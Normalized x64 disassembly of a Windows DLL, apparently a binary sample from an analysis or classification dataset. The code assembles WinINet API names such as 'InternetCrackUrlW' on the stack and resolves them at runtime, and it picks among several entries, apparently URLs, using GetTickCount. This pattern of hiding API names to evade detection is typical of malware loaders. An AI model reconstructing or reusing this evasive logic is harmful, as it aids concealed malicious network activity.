mov [ rbp - 0x10 ] r12w
mov rdx [ rsp + 0x68 ]
lea rcx [ rbp - 0x10 ]
call sub_180003b50
nop
lea r8 [ rbp - 0x10 ]
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp + 0x40 ]
call sub_180015750
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180016ff0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] r12
mov [ rbp + 0x68 ] r12w
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] r12
mov [ rbp + 0x40 ] r12w
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18001c80c
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rw-data ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rw-data ]
lea rcx [ rbp - 0x10 ]
call sub_180003b50
nop
movzx edx [ rsp + 0x74 ]
lea rcx [ rbp + 0x90 ]
call sub_180014c60
nop
mov r8 rax
lea rdx [ rbp - 0x10 ]
lea rcx [ rbp + 0xc0 ]
call sub_180015750
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180016ff0
nop
cmp [ rbp + 0x100 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov [ rbp + 0x100 ] 0x7
mov [ rbp + 0xf8 ] r12
mov [ rbp + 0xe8 ] r12w
cmp [ rbp + 0xd8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xe8 ]
call j_sub_18001c80c
mov [ rbp + 0xd8 ] 0x7
mov [ rbp + 0xd0 ] r12
mov [ rbp + 0xc0 ] r12w
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc0 ]
call j_sub_18001c80c
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] r12
mov [ rbp + 0x90 ] r12w
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_18001c80c
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
test sil sil
je r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18001c80c
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] r12
mov [ rbp + 0x40 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdx [ rw-data ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp + 0x40 ]
call sub_180003b50
lea r8 [ rbp + 0x40 ]
lea rdx [ rsp + 0x28 ]
mov rcx rbx
call sub_180015370
nop
mov rdi [ rsp + 0x28 ]
test rdi rdi
je r-xdata
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rw-data ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rw-data ]
lea rcx [ rbp - 0x38 ]
call sub_180003b50
nop
mov r8d [ rbp - 0x80 ]
mov [ rbp + 0x30 ] 0x7
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
mov rdx [ rsp + 0x78 ]
lea rcx [ rbp + 0x18 ]
call sub_180003b50
nop
lea r8 [ rbp + 0x18 ]
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp + 0x40 ]
call sub_180015750
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180016ff0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
movzx r9d [ rsp + 0x20 ]
lea r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_180015870
mov rcx rdi
call j_sub_18001c80c
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] r12
mov [ rbp + 0x68 ] r12w
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] r12
mov [ rbp + 0x40 ] r12w
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
mov [ rbp + 0x30 ] 0x7
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_18001c80c
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rw-data ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rw-data ]
lea rcx [ rbp - 0x38 ]
call sub_180003b50
nop
mov r8d [ rbp - 0x70 ]
mov [ rbp + 0x30 ] 0x7
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
mov rdx [ rbp - 0x78 ]
lea rcx [ rbp + 0x18 ]
call sub_180003b50
nop
lea r8 [ rbp + 0x18 ]
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp + 0x110 ]
call sub_180015750
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180016ff0
nop
cmp [ rbp + 0x150 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov [ rbp + 0x150 ] 0x7
mov [ rbp + 0x148 ] r12
mov [ rbp + 0x138 ] r12w
cmp [ rbp + 0x128 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x138 ]
call j_sub_18001c80c
mov [ rbp + 0x128 ] 0x7
mov [ rbp + 0x120 ] r12
mov [ rbp + 0x110 ] r12w
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x110 ]
call j_sub_18001c80c
mov [ rbp + 0x30 ] 0x7
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_18001c80c
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
sub_180017a00
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov r13 rcx
movzx eax [ rw-data ]
mov [ rcx + 0xd0 ] ax
movzx eax [ rw-data ]
mov [ rcx + 0xd2 ] al
movzx eax [ rw-data ]
mov [ rcx + 0xd3 ] al
lea rcx [ rbp - 0x61 ]
call sub_180008850
nop
mov r8d 0xb
lea rdx [ rw-data ]
lea rcx [ rbp - 0x61 ]
call sub_1800088d0
lea rbx [ rw-data ]
mov edi 0x2
nop [ rax + rax ] eax
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
lea rcx [ r13 + 0xf8 ]
lea rdx [ rbp - 0x29 ]
call sub_180009dd0
xor r9d r9d
lea r8 [ rbp - 0x29 ]
lea rdx [ rbp - 0x1 ]
mov rcx r13
call sub_180017260
nop
lea rcx [ r13 + 0xd8 ]
mov rdx rax
call sub_180016a70
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
add rbx 0x64
dec rdi
jne r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
nop
mov r8d 0x64
mov rdx rbx
lea rcx [ rbp - 0x61 ]
call sub_1800088c0
lea rdx [ rbp - 0x29 ]
lea rcx [ rbp - 0x61 ]
call sub_1800092e0
nop
cmp [ rbp - 0x19 ] 0x0
je r-xdata
lea rcx [ rsp + 0x20 ]
call sub_18001ba50
nop
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x20 ]
call sub_18001bee0
nop
mov rbx [ rsp + 0x28 ]
cmp rbx [ rbp - 0x79 ]
je r-xdata
mov r8d 0x82
lea rdx [ rw-data ]
lea rcx [ rbp - 0x61 ]
call sub_1800088c0
lea rdx [ rbp - 0x29 ]
lea rcx [ rbp - 0x61 ]
call sub_1800092e0
nop
cmp [ rbp - 0x19 ] 0x0
je r-xdata
nop
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
lea rcx [ r13 + 0x118 ]
lea rdx [ rbp - 0x29 ]
call sub_180009dd0
mov r9b 0x1
lea r8 [ rbp - 0x29 ]
lea rdx [ rbp - 0x1 ]
mov rcx r13
call sub_180017260
nop
lea rcx [ r13 + 0xd8 ]
mov rdx rax
call sub_180016a70
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
add rbx 0x28
cmp rbx [ rbp - 0x79 ]
jne r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
mov rbx [ r13 + 0xe0 ]
mov rdi [ r13 + 0xd8 ]
xor r14d r14d
cmp rdi rbx
je r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
nop
mov rdx rbx
lea rcx [ r13 + 0xf8 ]
call sub_180009dd0
xor r9d r9d
mov r8 rbx
lea rdx [ rbp - 0x1 ]
mov rcx r13
call sub_180017260
nop
mov rdx rax
lea rcx [ r13 + 0xd8 ]
call sub_180016a70
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov [ r13 + 0x38 ] r14
mov rax [ r13 + 0x100 ]
cmp [ r13 + 0xf8 ] rax
je r-xdata
cmp [ rdi + 0x10 ] r14
je r-xdata
mov rbx [ rsp + 0x28 ]
test rbx rbx
je r-xdata
lea rcx [ r13 + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx [ r13 + 0xf8 ]
call sub_180001ac0
nop
cmp rdi rbx
je r-xdata
add rdi 0x28
cmp rdi rbx
jne r-xdata
mov [ rsp + 0x28 ] r14
mov [ rbp - 0x79 ] r14
mov [ rbp - 0x71 ] r14
lea rcx [ rsp + 0x20 ]
call sub_1800132f0
nop
lea rcx [ rbp - 0x61 ]
call sub_180008890
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rbp - 0x79 ]
cmp rbx rdi
je r-xdata
lea rsi [ rdi + 0x28 ]
cmp rsi rbx
je r-xdata
jmp r-xdata
mov rcx rbx
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rdi rbx
je r-xdata
cmp [ rsi + 0x10 ] r14
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov r12 [ r13 + 0xe0 ]
cmp rbx r12
je r-xdata
add rsi 0x28
cmp rsi rbx
jne r-xdata
mov r12 rdi
add rdi 0x28
cmp r12 rsi
je r-xdata
mov rbx [ rsp + 0x28 ]
mov rsi [ r13 + 0xe0 ]
mov rbx rdi
cmp rdi rsi
je r-xdata
sub rbx rdi
nop [ rax ] eax
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov [ r13 + 0xe0 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
add rdi 0x28
lea rax [ rdi + rbx ]
cmp rax r12
jne r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] r14
mov [ r12 ] r14w
cmp [ rsi + 0x18 ] 0x8
jae r-xdata
mov rcx [ r12 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
lea rsi [ rdi + rbx ]
cmp rdi rsi
je r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
cmp [ rdi + rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov rax [ rsi ]
mov [ r12 ] rax
mov [ rsi ] r14
mov r8 [ rsi + 0x10 ]
inc r8
add r8 r8
mov rdx rsi
mov rcx r12
call sub_18001c4a0
jmp r-xdata
mov rax [ rsi ]
mov [ rdi ] rax
mov [ rsi ] r14
mov r8 [ rdi + rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rsi
mov rcx rdi
call sub_18001c4a0
jmp r-xdata
mov rax [ rsi + 0x10 ]
mov [ r12 + 0x10 ] rax
mov rax [ rsi + 0x18 ]
mov [ r12 + 0x18 ] rax
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r14
mov [ rsi ] r14w
mov rax [ rdi + rbx + 0x10 ]
mov [ rdi + 0x10 ] rax
mov rax [ rdi + rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov [ rdi + rbx + 0x18 ] 0x7
mov [ rdi + rbx + 0x10 ] r14
mov [ rsi ] r14w
sub_180017e90
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x158 ]
sub rsp 0x230
mov [ rbp - 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x128 ] rax
mov rdi r8
mov r12d edx
mov r13 rcx
xor r14d r14d
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x40 ] r14
xor ecx ecx
lea rax [ rsp + 0x30 ]
mov [ rbp + 0x108 ] r14
lea r9 [ rsp + 0x50 ]
mov r8 [ r8 + 0x8 ]
mov [ rsp + 0x20 ] cl
mov [ rbp + 0x100 ] rax
lea rcx [ rbp - 0x30 ]
movaps xmm0 [ rbp + 0x100 ]
movdqa [ rsp + 0x50 ] xmm0
cmp edx 0x4
mov rdx [ rdi ]
jne r-xdata
call sub_180016f10
call sub_180016e30
jmp r-xdata
sub rcx rax
mov rax 0x6666666666666667
imul rcx
mov rsi rdx
sar rsi 0x4
mov rax rsi
shr rax 0x3f
add rsi rax
mov [ rsp + 0x50 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x50 ]
call sub_18001d2ec
test esi esi
je r-xdata
mov rdx rdi
lea rcx [ rsp + 0x30 ]
call sub_180005cd0
mov rcx [ rsp + 0x38 ]
mov rax [ rsp + 0x30 ]
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
cmp rax rcx
jne r-xdata
mov ebx r14d
mov [ rsp + 0x50 ] ebx
xor edx edx
mov eax [ rsp + 0x50 ]
div esi
mov ebx edx
mov [ rsp + 0x50 ] edx
jmp r-xdata
mov [ rbp + 0x110 ] 0x65746e49
mov [ rbp + 0x114 ] 0x74656e72
mov [ rbp + 0x118 ] 0x63617243
mov [ rbp + 0x11c ] 0x6c72556b
mov [ rbp + 0x120 ] 0x57
lea rdx [ rbp + 0x110 ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov r11 rax
test rax rax
jne r-xdata
lea rcx [ rbp + 0x100 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
xor edx edx
lea r8d [ rdx + 0x60 ]
lea rcx [ rsp + 0x68 ]
call sub_18001c9f0
mov [ rsp + 0x60 ] 0x68
mov [ rbp - 0x80 ] 0x1
mov [ rbp - 0x70 ] 0x1
mov [ rbp - 0x60 ] 0x1
mov [ rbp - 0x50 ] 0x1
mov [ rbp + 0x100 ] 0x696e6977
mov [ rbp + 0x104 ] 0x2e74656e
mov [ rbp + 0x108 ] 0x6c6c64
lea rcx [ rbp + 0x100 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov esi ebx
lea rcx [ rsi + rsi * 4 ]
mov rax [ rsp + 0x30 ]
lea rcx [ rax + rcx * 8 ]
mov rax [ rcx + 0x10 ]
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
lea r9 [ rsp + 0x60 ]
xor r8d r8d
mov edx eax
call r11
cmp [ rsp + 0x74 ] 0x0
jne r-xdata
mov rcx [ rcx ]
mov rcx [ rbp + 0x128 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
mov rbx [ rdi + 0x8 ]
lea rcx [ rsi + rsi * 4 ]
mov rax [ rsp + 0x30 ]
lea rsi [ rax + rcx * 8 ]
mov r8 rsi
mov rdx rbx
mov rcx [ rdi ]
call sub_1800141a0
cmp rax rbx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdi r14
mov rcx rax
call sub_180008850
mov rdi rax
jmp r-xdata
mov r9 rbx
mov r8 rax
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180005930
mov [ r13 + 0x40 ] 0x0
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov r8 rsi
mov rdx rbx
mov rcx rax
call sub_180015570
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp r12d 0x3
jne r-xdata
lea r8d [ r12 + 0x1a ]
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088c0
movzx edx [ rbp - 0x7c ]
lea rcx [ rbp + 0xd8 ]
call sub_180014c60
mov rbx rax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
lea r8d [ r12 - 0x3 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180003b50
nop
mov r8d [ rbp - 0x80 ]
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] r14
mov [ rbp + 0x10 ] r14w
mov rdx [ rsp + 0x78 ]
lea rcx [ rbp + 0x10 ]
call sub_180003b50
nop
lea rdx [ rbp + 0xb0 ]
mov rcx rdi
call sub_1800092e0
nop
lea r8 [ rbp + 0x10 ]
mov rdx rax
lea rcx [ rbp + 0x38 ]
call sub_18000c6d0
nop
lea r8 [ rbp - 0x18 ]
mov rdx rax
lea rcx [ rbp + 0x60 ]
call sub_18000c6d0
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x88 ]
call sub_18000c6d0
nop
lea rcx [ r13 + 0x48 ]
mov rdx rax
call sub_180003f60
nop
cmp [ rbp + 0xa0 ] 0x8
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088d0
cmp r12d 0x4
jne r-xdata
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
jmp r-xdata
jmp r-xdata
mov rdx [ rbp - 0x78 ]
test rdx rdx
je r-xdata
lea r8d [ r12 + 0x17 ]
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088c0
movzx edx [ rbp - 0x7c ]
lea rcx [ rbp + 0xd8 ]
call sub_180014c60
mov rbx rax
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] r14
mov [ rbp + 0x10 ] r14w
lea r8d [ r12 - 0x2 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x10 ]
call sub_180003b50
nop
mov r8d [ rbp - 0x80 ]
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
mov rdx [ rsp + 0x78 ]
lea rcx [ rbp - 0x18 ]
call sub_180003b50
nop
lea rdx [ rbp + 0x88 ]
mov rcx rdi
call sub_1800092e0
nop
lea r8 [ rbp - 0x18 ]
mov rdx rax
lea rcx [ rbp + 0x60 ]
call sub_18000c6d0
nop
lea r8 [ rbp + 0x10 ]
mov rdx rax
lea rcx [ rbp + 0x38 ]
call sub_18000c6d0
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0xb0 ]
call sub_18000c6d0
nop
lea rcx [ r13 + 0x48 ]
mov rdx rax
call sub_180003f60
nop
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov [ rbp + 0xa0 ] 0x7
mov [ rbp + 0x98 ] r14
mov [ rbp + 0x88 ] r14w
cmp [ rbp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x88 ]
call j_sub_18001c80c
nop
mov rbx [ rsp + 0x30 ]
mov rdx [ rbp - 0x68 ]
test rdx rdx
je r-xdata
mov eax [ rbp - 0x70 ]
test eax eax
je r-xdata
mov [ rbp + 0xc8 ] 0x7
mov [ rbp + 0xc0 ] r14
mov [ rbp + 0xb0 ] r14w
cmp [ rbp + 0x50 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb0 ]
call j_sub_18001c80c
mov [ rbp + 0x78 ] 0x7
mov [ rbp + 0x70 ] r14
mov [ rbp + 0x60 ] r14w
cmp [ rbp + 0x50 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x60 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
test rdi rdi
je r-xdata
mov eax [ rbp - 0x60 ]
test eax eax
je r-xdata
mov r8d eax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
lea rcx [ rbp - 0x18 ]
call sub_180003b50
nop
lea rcx [ r13 + 0x70 ]
lea rdx [ rbp - 0x18 ]
call sub_180003f60
nop
cmp [ rbp ] 0x8
jb r-xdata
mov [ rbp + 0x50 ] 0x7
mov [ rbp + 0x48 ] r14
mov [ rbp + 0x38 ] r14w
cmp [ rbp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18001c80c
mov [ rbp + 0x50 ] 0x7
mov [ rbp + 0x48 ] r14
mov [ rbp + 0x38 ] r14w
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
nop
mov r8d eax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
lea rcx [ rbp - 0x18 ]
call sub_180003b50
nop
lea rcx [ r13 + 0x98 ]
lea rdx [ rbp - 0x18 ]
call sub_180003f60
nop
cmp [ rbp ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18001c80c
mov [ rbp + 0x78 ] 0x7
mov [ rbp + 0x70 ] r14
mov [ rbp + 0x60 ] r14w
cmp [ rbp + 0xa0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x60 ]
call j_sub_18001c80c
mov [ rbp + 0xc8 ] 0x7
mov [ rbp + 0xc0 ] r14
mov [ rbp + 0xb0 ] r14w
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb0 ]
call j_sub_18001c80c
mov rdi [ rsp + 0x38 ]
cmp rbx rdi
je r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18001c80c
mov [ rbp + 0xa0 ] 0x7
mov [ rbp + 0x98 ] r14
mov [ rbp + 0x88 ] r14w
cmp [ rbp ] 0x8
jb r-xdata
mov rcx [ rbp + 0x88 ]
call j_sub_18001c80c
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] r14
mov [ rbp + 0x10 ] r14w
cmp [ rbp ] 0x8
jb r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_18001c80c
nop [ rax + rax ] ax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18001c80c
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r14
mov [ rbp - 0x18 ] r14w
jmp r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] r14
mov [ rbp + 0x10 ] r14w
mov rcx [ rbp + 0x10 ]
call j_sub_18001c80c
cmp [ rbp + 0xf0 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xd8 ]
call j_sub_18001c80c
sub_1800186b0
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rsi rcx
mov [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
mov [ rcx + 0x28 ] 0x7
xor ebp ebp
mov [ rcx + 0x20 ] rbp
mov [ rcx + 0x10 ] bp
mov [ rcx + 0x60 ] 0x7
mov [ rcx + 0x58 ] rbp
mov [ rcx + 0x48 ] bp
mov [ rcx + 0x88 ] 0x7
mov [ rcx + 0x80 ] rbp
mov [ rcx + 0x70 ] bp
mov [ rcx + 0xb0 ] 0x7
mov [ rcx + 0xa8 ] rbp
mov [ rcx + 0x98 ] bp
mov [ rcx + 0xd8 ] rbp
mov [ rcx + 0xe0 ] rbp
mov [ rcx + 0xe8 ] rbp
mov [ rcx + 0xf8 ] rbp
mov [ rcx + 0x100 ] rbp
mov [ rcx + 0x108 ] rbp
mov [ rcx + 0x118 ] rbp
mov [ rcx + 0x120 ] rbp
mov [ rcx + 0x128 ] rbp
mov [ rcx + 0xc4 ] bpl
mov [ rcx + 0x40 ] bpl
mov [ rcx + 0xc0 ] ebp
mov [ rcx + 0xd0 ] ebp
add rcx 0xd8
mov r9 [ rcx + 0x8 ]
mov r8 [ rcx ]
lea rdx [ rsp + 0x58 ]
call sub_180005930
mov r9 [ rsi + 0x100 ]
mov r8 [ rsi + 0xf8 ]
lea rdx [ rsp + 0x58 ]
lea rcx [ rsi + 0xf8 ]
call sub_180005930
mov r9 [ rsi + 0x120 ]
mov r8 [ rsi + 0x118 ]
lea rdx [ rsp + 0x58 ]
lea rcx [ rsi + 0x118 ]
call sub_180005930
lea ecx [ rbp + 0x58 ]
call sub_18001c84c
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov [ rsi + 0xc8 ] rbp
mov rcx rsi
call sub_180017a00
mov rcx rsi
call sub_180014880
nop
mov rax rsi
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
mov rcx rax
call sub_18001a000
mov rbp rax
sub_180018820
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov [ rbp + 0x10 ] 0xfffffffffffffffe
mov [ rsp + 0x320 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
mov rsi rdx
mov rdi rcx
test rdx rdx
je r-xdata
xor eax eax
mov [ rbp + 0xb8 ] 0x696e6977
mov [ rbp + 0xbc ] 0x2e74656e
mov [ rbp + 0xc0 ] 0x6c6c64
lea rcx [ rbp + 0xb8 ]
call [ GetModuleHandleA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov [ rbp + 0x190 ] 0x65746e49
mov [ rbp + 0x194 ] 0x74656e72
mov [ rbp + 0x198 ] 0x72657551
mov [ rbp + 0x19c ] 0x74704f79
mov [ rbp + 0x1a0 ] 0x576e6f69
mov [ rbp + 0x1a4 ] 0x0
lea rdx [ rbp + 0x190 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x70 ] rax
mov [ rbp + 0x160 ] 0x65746e49
mov [ rbp + 0x164 ] 0x74656e72
